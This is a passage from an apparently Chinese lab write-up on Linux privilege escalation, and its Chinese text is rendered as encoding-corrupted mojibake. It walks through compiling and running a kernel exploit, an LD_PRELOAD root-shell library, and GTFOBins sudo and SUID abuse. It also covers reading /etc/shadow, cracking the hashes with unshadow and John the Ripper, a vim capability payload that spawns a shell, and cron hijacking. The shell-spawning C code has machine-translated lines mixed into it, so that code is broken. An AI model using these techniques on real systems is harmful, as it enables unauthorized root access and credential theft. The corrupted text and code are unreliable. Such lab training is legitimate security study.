ç§å·¥å…·å¯ä»¥å¸®åŠ©æ‚¨åœ¨æšä¸¾è¿‡ç¨‹ä¸­èŠ‚çœæ—¶é—´ã€‚è¿™äº›å·¥å…·åªèƒ½ç”¨äºèŠ‚çœæ—¶é—´ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½ä¼šé”™è¿‡ä¸€äº›æƒé™å‡çº§å‘é‡ã€‚ä¸‹é¢æ˜¯æµè¡Œçš„ Linux æšä¸¾å·¥å…·çš„åˆ—è¡¨ï¼Œä»¥åŠå„è‡ªçš„ Github å­˜å‚¨åº“çš„é“¾æ¥ã€‚ ç›®æ ‡ç³»ç»Ÿçš„ç¯å¢ƒå°†å½±å“æ‚¨å°†èƒ½å¤Ÿä½¿ç”¨çš„å·¥å…·ã€‚ä¾‹å¦‚ï¼Œå¦‚æœç›®æ ‡ç³»ç»Ÿä¸Šæœªå®‰è£…ç”¨ Python ç¼–å†™çš„å·¥å…·ï¼Œæ‚¨å°†æ— æ³•è¿è¡Œè¯¥å·¥å…·ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆç†Ÿæ‚‰å‡ ä¸ªå·¥å…·æ¯”æ‹¥æœ‰ä¸€ä¸ªé¦–é€‰å·¥å…·æ›´å¥½ã€‚ LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS LinEnum: https://github.com/rebootuser/LinEnum LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration Linux Priv Checker: https://github.com/linted/linuxprivchecker 0x04 ææƒï¼šå†…æ ¸æ¼æ´ ç†æƒ³æƒ…å†µä¸‹ï¼Œæƒé™å‡çº§ä¼šå¯¼è‡´ root æƒé™ã€‚æœ‰æ—¶å¯ä»¥ç®€å•åœ°é€šè¿‡åˆ©ç”¨ç°æœ‰æ¼æ´æ¥å®ç°ï¼Œæˆ–è€…åœ¨æŸäº›æƒ…å†µä¸‹é€šè¿‡è®¿é—®å…·æœ‰æ›´å¤šæƒé™ã€ä¿¡æ¯æˆ–è®¿é—®æƒé™çš„å¦ä¸€ä¸ªç”¨æˆ·å¸æˆ·æ¥å®ç°ã€‚ é™¤éå•ä¸ªæ¼æ´å¯¼è‡´ root shellï¼Œå¦åˆ™æƒé™æå‡è¿‡ç¨‹å°†ä¾èµ–äºé”™è¯¯é…ç½®å’Œå®½æ¾çš„æƒé™ã€‚ Linux ç³»ç»Ÿä¸Šçš„å†…æ ¸ç®¡ç†ç³»ç»Ÿå†…å­˜å’Œåº”ç”¨ç¨‹åºç­‰ç»„ä»¶ä¹‹é—´çš„é€šä¿¡ã€‚è¿™ä¸ªå…³é”®åŠŸèƒ½éœ€è¦å†…æ ¸æœ‰ç‰¹å®šçš„æƒé™ï¼›å› æ­¤ï¼ŒæˆåŠŸåˆ©ç”¨è¯¥æ¼æ´å¯èƒ½ä¼šå¯¼è‡´ root æƒé™ã€‚ å†…æ ¸åˆ©ç”¨æ–¹æ³•å¾ˆç®€å•ï¼› è¯†åˆ«å†…æ ¸ç‰ˆæœ¬ æœç´¢å¹¶æ‰¾åˆ°ç›®æ ‡ç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬çš„æ¼æ´åˆ©ç”¨ä»£ç  è¿è¡Œæ¼æ´åˆ©ç”¨ç¨‹åº è™½ç„¶çœ‹èµ·æ¥å¾ˆç®€å•ï¼Œä½†è¯·è®°ä½ï¼Œå¤±è´¥çš„å†…æ ¸æ¼æ´å¯èƒ½ä¼šå¯¼è‡´ç³»ç»Ÿå´©æºƒã€‚åœ¨å°è¯•å†…æ ¸æ¼æ´ä¹‹å‰ï¼Œè¯·ç¡®ä¿è¿™ç§æ½œåœ¨ç»“æœåœ¨æ¸—é€æµ‹è¯•èŒƒå›´å†…æ˜¯å¯ä»¥æ¥å—çš„ã€‚ **Research sources: ** æ ¹æ®æ‚¨çš„å‘ç°ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ Google æœç´¢ç°æœ‰çš„æ¼æ´åˆ©ç”¨ä»£ç ã€‚ https://www.linuxkernelcves.com/cves ç­‰æ¥æºä¹Ÿå¾ˆæœ‰ç”¨ã€‚ å¦ä¸€ç§é€‰æ‹©æ˜¯ä½¿ç”¨ LESï¼ˆLinux Exploit Suggesterï¼‰ä¹‹ç±»çš„è„šæœ¬ï¼Œä½†è¯·è®°ä½ï¼Œè¿™äº›å·¥å…·å¯èƒ½ä¼šç”Ÿæˆè¯¯æŠ¥ï¼ˆæŠ¥å‘Šä¸å½±å“ç›®æ ‡ç³»ç»Ÿçš„å†…æ ¸æ¼æ´ï¼‰æˆ–æ¼æŠ¥ï¼ˆä¸æŠ¥å‘Šä»»ä½•å†…æ ¸æ¼æ´ï¼Œå°½ç®¡å†…æ ¸æ˜¯æ˜“å—ä¼¤å®³çš„ï¼‰ã€‚ **Hints/Notes: ** åœ¨ Googleã€Exploit-db æˆ– searchsploit ä¸Šæœç´¢æ¼æ´æ—¶å¯¹å†…æ ¸ç‰ˆæœ¬è¿‡äºå…·ä½“ åœ¨å¯åŠ¨æ¼æ´åˆ©ç”¨ä»£ç ä¹‹å‰ï¼Œè¯·ç¡®ä¿æ‚¨äº†è§£å…¶å·¥ä½œåŸç†ã€‚æŸäº›æ¼æ´åˆ©ç”¨ä»£ç å¯ä»¥å¯¹æ“ä½œç³»ç»Ÿè¿›è¡Œæ›´æ”¹ï¼Œä»è€Œä½¿å®ƒä»¬åœ¨è¿›ä¸€æ­¥ä½¿ç”¨æ—¶ä¸å®‰å…¨ï¼Œæˆ–è€…å¯¹ç³»ç»Ÿè¿›è¡Œä¸å¯é€†è½¬çš„æ›´æ”¹ï¼Œä»è€Œåœ¨ä»¥åäº§ç”Ÿé—®é¢˜ã€‚å½“ç„¶ï¼Œè¿™äº›åœ¨å®éªŒå®¤æˆ– CTF ç¯å¢ƒä¸­å¯èƒ½ä¸æ˜¯å¤§é—®é¢˜ï¼Œä½†åœ¨çœŸæ­£çš„æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­è¿™äº›ç»å¯¹æ˜¯ç¦å¿Œã€‚ æœ‰äº›æ¼æ´ä¸€æ—¦è¿è¡Œå¯èƒ½éœ€è¦è¿›ä¸€æ­¥çš„äº¤äº’ã€‚é˜…è¯»æ¼æ´åˆ©ç”¨ä»£ç æä¾›çš„æ‰€æœ‰æ³¨é‡Šå’Œè¯´æ˜ã€‚ æ‚¨å¯ä»¥åˆ†åˆ«ä½¿ç”¨ SimpleHTTPServer Python æ¨¡å—å’Œ wget å°†æ¼æ´åˆ©ç”¨ä»£ç ä»æ‚¨çš„è®¡ç®—æœºä¼ è¾“åˆ°ç›®æ ‡ç³»ç»Ÿã€‚ è¿™é‡Œç”±äºå½“æ—¶å¿˜è®°ä¿å­˜äº†ï¼Œä¹Ÿæ‡’å¾—å†æä¸€æ¬¡ï¼Œå°±å€Ÿç”¨ç…§ç‰‡è¿‡ä¸€ä¸‹ é¦–å…ˆä¸Šè¿°æš´éœ²äº†linuxå†…æ ¸ç‰ˆæœ¬ï¼Œç›´æ¥Googleæœç´¢çœ‹æœ‰æ²¡æœ‰ç›¸å…³æ¼æ´ï¼Œå¹¸è¿çš„æ˜¯å­˜åœ¨ ç›´æ¥ä¸‹è½½åˆ°æ”»å‡»æœºï¼Œæ¥ç€pythonå¼€å¯httpæœåŠ¡ï¼Œä¸Šä¼ æ¶æ„æ–‡ä»¶åˆ°é¶æœºä¸Šï¼Œæ¥ç€åœ¨é¶æœºä¸Š gcc 37292.c -o priv ä¸è¿‡ä¸‹è½½çš„æ—¶å€™å°±ä¼šå‘ç°å½“å‰ç›®å½•ä¼šä¸å­˜åœ¨æŸç§æƒé™ï¼ˆæ²¡ç»†çœ‹å¿˜äº†ï¼‰ï¼Œæ¥ç€æˆ‘ä»¬å°±å¯ä»¥è½¬åˆ°tmpç›®å½•ä¸‹ï¼Œå› ä¸ºè¿™æ¡ç›®å½•æ¯«æ— é™åˆ¶ ä¸‹è½½æˆåŠŸåç›´æ¥./privæ‰§è¡Œæ¶æ„æ–‡ä»¶å³å¯ï¼Œæœ€ç»ˆä¼šå‘ç°è·å–rootæƒé™ 0x05 ææƒï¼šSudo é»˜è®¤æƒ…å†µä¸‹ï¼Œsudo å‘½ä»¤å…è®¸æ‚¨ä»¥ root æƒé™è¿è¡Œç¨‹åºã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç³»ç»Ÿç®¡ç†å‘˜å¯èƒ½éœ€è¦ä¸ºæ™®é€šç”¨æˆ·æä¾›ä¸€å®šçš„æƒé™çµæ´»æ€§ã€‚ä¾‹å¦‚ï¼Œåˆçº§ SOC åˆ†æå¸ˆå¯èƒ½éœ€è¦å®šæœŸä½¿ç”¨ Nmapï¼Œä½†ä¸ä¼šè·å¾—å®Œå…¨ root è®¿é—®æƒé™ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥å…è®¸è¯¥ç”¨æˆ·ä»…ä»¥ root æƒé™è¿è¡Œ Nmapï¼ŒåŒæ—¶åœ¨ç³»ç»Ÿçš„å…¶ä½™éƒ¨åˆ†ä¿æŒå…¶å¸¸è§„æƒé™çº§åˆ«ã€‚ ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥ä½¿ç”¨ sudo -l å‘½ä»¤æ£€æŸ¥å…¶ä¸rootæƒé™ç›¸å…³çš„å½“å‰æƒ…å†µã€‚ https://gtfobins.github.io/ æ˜¯ä¸€ä¸ªæœ‰ä»·å€¼çš„èµ„æºï¼Œå®ƒæä¾›äº†æœ‰å…³å¦‚ä½•ä½¿ç”¨æ‚¨å¯èƒ½æ‹¥æœ‰ sudo æƒé™çš„ä»»ä½•ç¨‹åºçš„ä¿¡æ¯ã€‚ åˆ©ç”¨åº”ç”¨ç¨‹åºåŠŸèƒ½ æŸäº›åº”ç”¨ç¨‹åºåœ¨æ­¤ä¸Šä¸‹æ–‡ä¸­ä¸ä¼šæœ‰å·²çŸ¥çš„æ¼æ´ã€‚æ‚¨å¯èƒ½ä¼šçœ‹åˆ°çš„è¿™æ ·çš„åº”ç”¨ç¨‹åºæ˜¯ Apache2 æœåŠ¡å™¨ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨â€œé»‘å®¢â€æ¥åˆ©ç”¨åº”ç”¨ç¨‹åºçš„åŠŸèƒ½æ¥æ³„éœ²ä¿¡æ¯ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼ŒApache2 æœ‰ä¸€ä¸ªé€‰é¡¹æ”¯æŒåŠ è½½å¤‡ç”¨é…ç½®æ–‡ä»¶ï¼ˆ -f ï¼šæŒ‡å®šå¤‡ç”¨ ServerConfigFileï¼‰ã€‚ ä½¿ç”¨æ­¤é€‰é¡¹åŠ è½½ /etc/shadow æ–‡ä»¶å°†å¯¼è‡´ä¸€æ¡é”™è¯¯æ¶ˆæ¯ï¼Œå…¶ä¸­åŒ…å« /etc/shadow æ–‡ä»¶çš„ç¬¬ä¸€è¡Œã€‚ Leverage LD_PRELOAD åœ¨æŸäº›ç³»ç»Ÿä¸Šï¼Œæ‚¨å¯èƒ½ä¼šçœ‹åˆ° LD_PRELOAD ç¯å¢ƒé€‰é¡¹ã€‚ LD_PRELOAD æ˜¯ä¸€ä¸ªå…è®¸ä»»ä½•ç¨‹åºä½¿ç”¨å…±äº«åº“çš„å‡½æ•°ã€‚è¿™ç¯‡åšæ–‡å°†è®©æ‚¨äº†è§£ LD_PRELOAD çš„åŠŸèƒ½ã€‚å¦‚æœå¯ç”¨â€œenv_keepâ€é€‰é¡¹ï¼Œæˆ‘ä»¬å¯ä»¥ç”Ÿæˆä¸€ä¸ªå…±äº«åº“ï¼Œè¯¥åº“å°†åœ¨ç¨‹åºè¿è¡Œä¹‹å‰åŠ è½½å¹¶æ‰§è¡Œã€‚è¯·æ³¨æ„ï¼Œå¦‚æœçœŸå®ç”¨æˆ· ID ä¸æœ‰æ•ˆç”¨æˆ· ID ä¸åŒï¼ŒLD_PRELOAD é€‰é¡¹å°†è¢«å¿½ç•¥ã€‚ è¿™ä¸ªç‰¹æƒå‡çº§å‘é‡çš„æ­¥éª¤å¯ä»¥æ€»ç»“å¦‚ä¸‹ï¼š æ£€æŸ¥ LD_PRELOADï¼ˆä½¿ç”¨ env_keep é€‰é¡¹ï¼‰ ç¼–å†™ä¸€ä¸ªç®€å•çš„ C ä»£ç ç¼–è¯‘ä¸ºå…±äº«å¯¹è±¡ï¼ˆ.so æ‰©å±•åï¼‰æ–‡ä»¶ ä½¿ç”¨ sudo æƒé™å’ŒæŒ‡å‘æˆ‘ä»¬çš„ .so æ–‡ä»¶çš„ LD_PRELOAD é€‰é¡¹è¿è¡Œç¨‹åº C ä»£ç å°†ç®€å•åœ°ç”Ÿæˆä¸€ä¸ª root shellï¼Œå¯ä»¥ç¼–å†™å¦‚ä¸‹ï¼› #include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdlib.h&gt; void _init() { æ— æ•ˆ_init() { unsetenv(\"LD_PRELOAD\"); å–æ¶ˆè®¾ç½®ç¯å¢ƒï¼ˆâ€œLD_PRELOADâ€ï¼‰ï¼› setgid(0); è®¾ç½®gid(0); setuid(0); system(\"/bin/bash\"); ç³»ç»Ÿï¼ˆâ€œ/bin/bashâ€ï¼‰ï¼› } æˆ‘ä»¬å¯ä»¥å°†æ­¤ä»£ç ä¿å­˜ä¸º shell.cï¼Œå¹¶ä½¿ç”¨ gcc ä½¿ç”¨ä»¥ä¸‹å‚æ•°å°†å…¶ç¼–è¯‘ä¸ºå…±äº«å¯¹è±¡æ–‡ä»¶ï¼› gcc -fPIC -shared -o shell.so shell.c -nostartfiles ç°åœ¨ï¼Œå½“å¯åŠ¨ç”¨æˆ·å¯ä»¥ä½¿ç”¨ sudo è¿è¡Œçš„ä»»ä½•ç¨‹åºæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ­¤å…±äº«å¯¹è±¡æ–‡ä»¶ã€‚åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼ŒApache2ã€find æˆ–å‡ ä¹ä»»ä½•æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ sudo è¿è¡Œçš„ç¨‹åºéƒ½å¯ä»¥ä½¿ç”¨ã€‚ æˆ‘ä»¬éœ€è¦é€šè¿‡æŒ‡å®šLD_PRELOADé€‰é¡¹æ¥è¿è¡Œç¨‹åºï¼Œå¦‚ä¸‹ï¼› sudo LD_PRELOAD=/home/user/ldpreload/shell.so find è¿™å°†å¯¼è‡´ç”Ÿæˆå…·æœ‰ root æƒé™çš„ shellã€‚ ä½†è¿™ä¸€å…³ä¸ä¸Šè¿°æ­¥éª¤æ— å…³ï¼Œå¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°æ²¡æœ‰LD_PRELOADé€‰é¡¹ å› æ­¤è¿™ä¸€å…³é‡‡ç”¨å…¶ä»–ææƒï¼Œå¦‚ä¸Šå›¾ï¼Œå¯ä»¥çœ‹åˆ°sudoå¯ä»¥ä½¿ç”¨çš„å‘½ä»¤æœ‰ä¸‰ç§ï¼Œé‚£æˆ‘ä»¬åˆ©ç”¨è¿™ä¸‰ç§å‘½ä»¤å‡å¯ä»¥ææƒ https://gtfobins.github.io/ è®¿é—®ä¹‹åæœç´¢findæˆ–lessæˆ–nanoå‘½ä»¤ æ‰¾åˆ°å¯¹åº”çš„sudoå‘½ä»¤ï¼Œç›´æ¥è¾“å…¥ä¹‹åï¼Œå³å¯è¾¾åˆ°rootæƒé™ 0x06 ææƒï¼šSuid è®¸å¤š Linux æƒé™æ§åˆ¶ä¾èµ–äºæ§åˆ¶ç”¨æˆ·å’Œæ–‡ä»¶äº¤äº’ã€‚è¿™æ˜¯é€šè¿‡æƒé™å®Œæˆçš„ã€‚åˆ°ç°åœ¨ä¸ºæ­¢ï¼Œæ‚¨çŸ¥é“æ–‡ä»¶å¯ä»¥å…·æœ‰è¯»ã€å†™å’Œæ‰§è¡Œæƒé™ã€‚è¿™äº›æ˜¯åœ¨å…¶æƒé™çº§åˆ«å†…æä¾›ç»™ç”¨æˆ·çš„ã€‚è¿™ä¼šéšç€ SUIDï¼ˆé›†ç”¨æˆ·æ ‡è¯†ï¼‰å’Œ SGIDï¼ˆé›†ç»„æ ‡è¯†ï¼‰è€Œæ”¹å˜ã€‚è¿™äº›å…è®¸åˆ†åˆ«ä»¥æ–‡ä»¶æ‰€æœ‰è€…æˆ–ç»„æ‰€æœ‰è€…çš„æƒé™çº§åˆ«æ‰§è¡Œæ–‡ä»¶ã€‚ æ‚¨ä¼šæ³¨æ„åˆ°è¿™äº›æ–‡ä»¶æœ‰ä¸€ä¸ªâ€œsâ€ä½è®¾ç½®ï¼Œæ˜¾ç¤ºå…¶ç‰¹æ®Šæƒé™çº§åˆ«ã€‚ find / -type f -perm -04000 -ls 2&gt;/dev/null å°†åˆ—å‡ºè®¾ç½®äº† SUID æˆ– SGID ä½çš„æ–‡ä»¶ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•ç¤ºä¾‹ï¼š ä¸€ä¸ªå¥½çš„åšæ³•æ˜¯å°†æ­¤åˆ—è¡¨ä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶ä¸ GTFOBins (https://gtfobins.github.io) è¿›è¡Œæ¯”è¾ƒã€‚å•å‡» SUID æŒ‰é’®å°†è¿‡æ»¤è®¾ç½® SUID ä½æ—¶å·²çŸ¥å¯åˆ©ç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨æ­¤é“¾æ¥è·å–é¢„è¿‡æ»¤åˆ—è¡¨ https://gtfobins.github.io/#+suidï¼‰ã€‚ ä¸Šé¢çš„åˆ—è¡¨æ˜¾ç¤º Nano å·²è®¾ç½® SUID ä½ã€‚ä¸å¹¸çš„æ˜¯ï¼ŒGTFObins å¹¶æ²¡æœ‰è®©æˆ‘ä»¬è½»æ¾è·èƒœã€‚å¯¹äºç°å®ç”Ÿæ´»ä¸­çš„ç‰¹æƒå‡çº§åœºæ™¯æ¥è¯´ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸­é—´æ­¥éª¤æ¥å¸®åŠ©æˆ‘ä»¬åˆ©ç”¨æˆ‘ä»¬æ‰€æ‹¥æœ‰çš„ä»»ä½•å¾®å°çš„å‘ç°ã€‚ æ³¨æ„ï¼šé™„åŠ çš„è™šæ‹Ÿæœºæœ‰å¦ä¸€ä¸ªå…·æœ‰ SUID çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè€Œä¸æ˜¯ nano ã€‚ Nano æ–‡æœ¬ç¼–è¾‘å™¨çš„ SUID ä½è®¾ç½®å…è®¸æˆ‘ä»¬ä½¿ç”¨æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™åˆ›å»ºã€ç¼–è¾‘å’Œè¯»å–æ–‡ä»¶ã€‚ Nano ç”± root æ‹¥æœ‰ï¼Œè¿™å¯èƒ½æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä»¥æ¯”å½“å‰ç”¨æˆ·æ›´é«˜çš„æƒé™çº§åˆ«è¯»å–å’Œç¼–è¾‘æ–‡ä»¶ã€‚åœ¨æ­¤é˜¶æ®µï¼Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªåŸºæœ¬çš„æƒé™å‡çº§é€‰é¡¹ï¼šè¯»å– /etc/shadow æ–‡ä»¶æˆ–å°†æˆ‘ä»¬çš„ç”¨æˆ·æ·»åŠ åˆ° /etc/passwd ã€‚ ä»¥ä¸‹æ˜¯ä½¿ç”¨è¿™ä¸¤ä¸ªå‘é‡çš„ç®€å•æ­¥éª¤ã€‚ è¯»å– /etc/shadow æ–‡ä»¶ æˆ‘ä»¬çœ‹åˆ° Nano æ–‡æœ¬ç¼–è¾‘å™¨é€šè¿‡è¿è¡Œ find / -type f -perm -04000 -ls 2&gt;/dev/null å‘½ä»¤è®¾ç½®äº† SUID ä½ã€‚ nano /etc/shadow å°†æ‰“å° /etc/shadow æ–‡ä»¶çš„å†…å®¹ã€‚æˆ‘ä»¬ç°åœ¨å¯ä»¥ä½¿ç”¨ unshadow å·¥å…·åˆ›å»ºä¸€ä¸ªå¯ç”± John the Ripper ç ´è§£çš„æ–‡ä»¶ã€‚è¦å®ç°æ­¤ç›®çš„ï¼Œunshadow éœ€è¦ /etc/shadow å’Œ /etc/passwd æ–‡ä»¶ã€‚ unshadowå·¥å…·çš„ç”¨æ³•å¦‚ä¸‹æ‰€ç¤ºï¼šunshadow passwd.txt shadow.txt &gt; passwords.txt æœ‰äº†æ­£ç¡®çš„å•è¯åˆ—è¡¨å’Œä¸€ç‚¹è¿æ°”ï¼Œå¼€è†›æ‰‹çº¦ç¿°å°±å¯ä»¥ä»¥æ˜æ–‡å½¢å¼è¿”å›ä¸€ä¸ªæˆ–å¤šä¸ªå¯†ç ã€‚æœ‰å…³å¼€è†›æ‰‹çº¦ç¿°çš„æ›´è¯¦ç»†æˆ¿é—´ï¼Œæ‚¨å¯ä»¥è®¿é—® https://tryhackme.com/room/johntheripper0 å¦ä¸€ç§é€‰æ‹©æ˜¯æ·»åŠ å…·æœ‰ root æƒé™çš„æ–°ç”¨æˆ·ã€‚è¿™å°†å¸®åŠ©æˆ‘ä»¬ç»•è¿‡å¯†ç ç ´è§£çš„ç¹çè¿‡ç¨‹ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„æ–¹æ³•ï¼š æˆ‘ä»¬éœ€è¦æˆ‘ä»¬å¸Œæœ›æ–°ç”¨æˆ·æ‹¥æœ‰çš„å¯†ç çš„å“ˆå¸Œå€¼ã€‚è¿™å¯ä»¥ä½¿ç”¨ Kali Linux ä¸Šçš„ openssl å·¥å…·å¿«é€Ÿå®Œæˆã€‚ ç„¶åï¼Œæˆ‘ä»¬å°†æ­¤å¯†ç å’Œç”¨æˆ·åæ·»åŠ åˆ° /etc/passwd æ–‡ä»¶ä¸­ã€‚ æ·»åŠ ç”¨æˆ·åï¼ˆè¯·æ³¨æ„å¦‚ä½•ä½¿ç”¨ root:/bin/bash æ¥æä¾› root shellï¼‰ï¼Œæˆ‘ä»¬å°†éœ€è¦åˆ‡æ¢åˆ°è¯¥ç”¨æˆ·ï¼Œå¹¶å¸Œæœ›æ‹¥æœ‰ root æƒé™ã€‚ ç°åœ¨è½®åˆ°æ‚¨ä½¿ç”¨åˆšåˆšå­¦åˆ°çš„æŠ€èƒ½æ¥æŸ¥æ‰¾æ˜“å—æ”»å‡»çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬è¿æ¥é¶æœºï¼Œä¹‹åcat /etc/passwdæŸ¥çœ‹ç”¨æˆ· éšåé¢˜ç›®è®©æˆ‘ä»¬è·å–user2çš„å¯†ç ï¼Œè¿™é‡Œå°±ç”¨åˆ°ä¸Šé¢çš„æ–¹æ³•ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¯»å–ç›¸å…³æ–‡ä»¶äº† base64 /etc/passwd | base64 --decode base64 /etc/shadow | base64 --decode æ˜¾ç„¶ï¼Œä¸¤è€…å¯¹æ¯”å°±çŸ¥é“æˆ‘ä»¬åº”è¯¥é‡ç‚¹å…³æ³¨å“ªå‡ ä¸ªç”¨æˆ·äº†ï¼ˆä¹Ÿå°±æ˜¯æœ€åä¸‰ä¸ªç”¨æˆ·ï¼‰ï¼Œæˆ‘ä»¬å°†å…¶åˆ†åˆ«å¤åˆ¶åˆ°ç›¸å…³æ–‡ä»¶ä¸­ å¦‚ä¸Šå›¾åˆ›å»ºå¥½ç›¸å…³æ–‡ä»¶ä¹‹å unshadow passwd.txt shadow.txt &gt; passwords.txt john /usr/share/wordlists/passwords/rockyou.txt passwords.txt åˆ©ç”¨johnè¿›è¡Œå¯†ç çš„ç ´è§£ æˆåŠŸå¾—åˆ°user2çš„å¯†ç  æœ€åçš„flagå¯ä»¥é€šè¿‡rootæƒé™è¯»å–ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨base64å‘½ä»¤è¯»å– 0x07 ææƒï¼šCapabilitiesï¼ˆèƒ½åŠ›ï¼‰ ç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥ç”¨æ¥æé«˜è¿›ç¨‹æˆ–äºŒè¿›åˆ¶æ–‡ä»¶çš„æƒé™çº§åˆ«çš„å¦ä¸€ç§æ–¹æ³•æ˜¯â€œåŠŸèƒ½â€ã€‚åŠŸèƒ½æœ‰åŠ©äºæ›´ç²¾ç»†åœ°ç®¡ç†æƒé™ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ SOC åˆ†æå¸ˆéœ€è¦ä½¿ç”¨éœ€è¦å¯åŠ¨å¥—æ¥å­—è¿æ¥çš„å·¥å…·ï¼Œæ™®é€šç”¨æˆ·å°†æ— æ³•åšåˆ°è¿™ä¸€ç‚¹ã€‚å¦‚æœç³»ç»Ÿç®¡ç†å‘˜ä¸æƒ³æˆäºˆè¯¥ç”¨æˆ·æ›´é«˜çš„æƒé™ï¼Œä»–ä»¬å¯ä»¥æ›´æ”¹äºŒè¿›åˆ¶æ–‡ä»¶çš„åŠŸèƒ½ã€‚å› æ­¤ï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶æ— éœ€æ›´é«˜æƒé™çš„ç”¨æˆ·å³å¯å®Œæˆå…¶ä»»åŠ¡ã€‚ åŠŸèƒ½æ‰‹å†Œé¡µæä¾›äº†æœ‰å…³å…¶ç”¨æ³•å’Œé€‰é¡¹çš„è¯¦ç»†ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ getcap å·¥å…·åˆ—å‡ºå¯ç”¨çš„åŠŸèƒ½ã€‚ å½“ä»¥éç‰¹æƒç”¨æˆ·èº«ä»½è¿è¡Œæ—¶ï¼Œ getcap -r / å°†ç”Ÿæˆå¤§é‡é”™è¯¯ï¼Œå› æ­¤æœ€å¥½å°†é”™è¯¯æ¶ˆæ¯é‡å®šå‘åˆ° /dev/nullã€‚ è¯·æ³¨æ„ï¼Œvim åŠå…¶å‰¯æœ¬éƒ½æ²¡æœ‰è®¾ç½® SUID ä½ã€‚å› æ­¤ï¼Œåœ¨æšä¸¾æ–‡ä»¶ä»¥æŸ¥æ‰¾ SUID æ—¶ï¼Œæ— æ³•å‘ç°æ­¤æƒé™å‡çº§å‘é‡ã€‚ GTFObins æœ‰ä¸€ä¸ªå¾ˆå¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶åˆ—è¡¨ï¼Œå¦‚æœæˆ‘ä»¬å‘ç°ä»»ä½•è®¾ç½®çš„åŠŸèƒ½ï¼Œå¯ä»¥åˆ©ç”¨è¿™äº›äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œæƒé™å‡çº§ã€‚ æˆ‘ä»¬æ³¨æ„åˆ° vim å¯ä»¥ä¸ä»¥ä¸‹å‘½ä»¤å’Œè´Ÿè½½ä¸€èµ·ä½¿ç”¨ï¼š ä¼¼ä¹æ˜¯åªæœ‰è®¾ç½®ä¸ºsetcap cap_setuid+ep vimæ‰å¯ä»¥ ./vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")' 0x08 ææƒï¼šCronä»»åŠ¡ Cron ä»»åŠ¡ç”¨äºåœ¨ç‰¹å®šæ—¶é—´è¿è¡Œè„šæœ¬æˆ–äºŒè¿›åˆ¶æ–‡ä»¶ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒä»¬ä»¥å…¶æ‰€æœ‰è€…çš„æƒé™è¿è¡Œï¼Œè€Œä¸æ˜¯ä»¥å½“å‰ç”¨æˆ·çš„æƒé™è¿è¡Œã€‚è™½ç„¶æ­£ç¡®é…ç½®çš„ cron ä½œä¸šæœ¬èº«å¹¶ä¸å®¹æ˜“å—åˆ°æ”»å‡»ï¼Œä½†å®ƒä»¬åœ¨æŸäº›æƒ…å†µä¸‹å¯ä»¥æä¾›æƒé™å‡çº§å‘é‡ã€‚ è¿™ä¸ªæƒ³æ³•å¾ˆç®€å•ï¼›å¦‚æœæœ‰ä¸€ä¸ªä»¥ root æƒé™è¿è¡Œçš„è®¡åˆ’ä»»åŠ¡ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥æ›´æ”¹å°†è¿è¡Œçš„è„šæœ¬ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„è„šæœ¬å°†ä»¥ root æƒé™è¿è¡Œã€‚ Cron ä½œä¸šé…ç½®å­˜å‚¨ä¸º crontabï¼ˆcron è¡¨ï¼‰ï¼Œä»¥æŸ¥çœ‹ä»»åŠ¡ä¸‹æ¬¡è¿è¡Œçš„æ—¶é—´å’Œæ—¥æœŸã€‚ ç³»ç»Ÿä¸Šçš„æ¯ä¸ªç”¨æˆ·éƒ½æœ‰è‡ªå·±çš„ crontab æ–‡ä»¶ï¼Œå¹¶ä¸”æ— è®ºæ˜¯å¦ç™»å½•éƒ½å¯ä»¥è¿è¡Œç‰¹å®šä»»åŠ¡ã€‚æ­£å¦‚æ‚¨æ‰€æœŸæœ›çš„ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ‰¾åˆ°ç”± root è®¾ç½®çš„ cron ä½œä¸šå¹¶è®©å®ƒè¿è¡Œæˆ‘ä»¬çš„è„šæœ¬ï¼ˆæœ€å¥½æ˜¯ shellï¼‰ã€‚ 